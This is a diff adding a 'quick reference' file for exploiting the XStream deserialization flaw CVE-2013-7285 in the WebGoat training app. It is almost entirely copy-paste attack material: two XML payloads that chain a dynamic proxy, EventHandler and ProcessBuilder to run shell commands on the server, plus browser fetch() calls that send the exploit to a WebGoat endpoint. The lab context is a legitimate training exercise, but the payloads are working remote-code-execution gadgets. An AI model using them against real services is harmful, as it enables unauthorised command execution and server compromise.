@@ -1,0 +1,98 @@
+====================================================================
+XSTREAM CVE-2013-7285 - QUICK REFERENCE
+====================================================================
+
+RECOMMENDED PAYLOAD (Copy and paste into WebGoat):
+---------------------------------------------------
+
+<sorted-set>
+  <string>foo</string>
+  <dynamic-proxy>
+    <interface>java.lang.Comparable</interface>
+    <handler class="java.beans.EventHandler">
+      <target class="java.lang.ProcessBuilder">
+        <command>
+          <string>touch</string>
+          <string>/tmp/pwned</string>
+        </command>
+      </target>
+      <action>start</action>
+    </handler>
+  </dynamic-proxy>
+</sorted-set>
+
+
+ALTERNATIVE PAYLOAD (if first doesn't work):
+---------------------------------------------
+
+<contact>
+  <id>999</id>
+  <firstName>
+    <sorted-set>
+      <string>foo</string>
+      <dynamic-proxy>
+        <interface>java.lang.Comparable</interface>
+        <handler class="java.beans.EventHandler">
+          <target class="java.lang.ProcessBuilder">
+            <command>
+              <string>whoami</string>
+            </command>
+          </target>
+          <action>start</action>
+        </handler>
+      </dynamic-proxy>
+    </sorted-set>
+  </firstName>
+  <lastName>Exploit</lastName>
+  <email>exploit@test.com</email>
+</contact>
+
+
+BROWSER CONSOLE METHOD:
+------------------------
+
+// Normal contact test
+fetch('http://192.168.254.112:8001/WebGoat/vulnerable-components/XStream', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/xml'},
+  body: `<contact>
+    <id>1</id>
+    <firstName>Bruce</firstName>
+    <lastName>Mayhew</lastName>
+    <email>webgoat@owasp.org</email>
+</contact>`
+}).then(r => r.text()).then(console.log);
+
+
+// Send exploit
+fetch('http://192.168.254.112:8001/WebGoat/vulnerable-components/XStream', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/xml'},
+  body: `<sorted-set>
+  <string>foo</string>
+  <dynamic-proxy>
+    <interface>java.lang.Comparable</interface>
+    <handler class="java.beans.EventHandler">
+      <target class="java.lang.ProcessBuilder">
+        <command>
+          <string>touch</string>
+          <string>/tmp/pwned</string>
+        </command>
+      </target>
+      <action>start</action>
+    </handler>
+  </dynamic-proxy>
+</sorted-set>`
+}).then(r => r.text()).then(console.log);
+
+
+WHAT TO EXPECT:
+---------------
+- Server accepts the payload (200 OK)
+- May return success or normal response
+- Command executes silently on server
+- Check if lesson marks as complete
+
+====================================================================
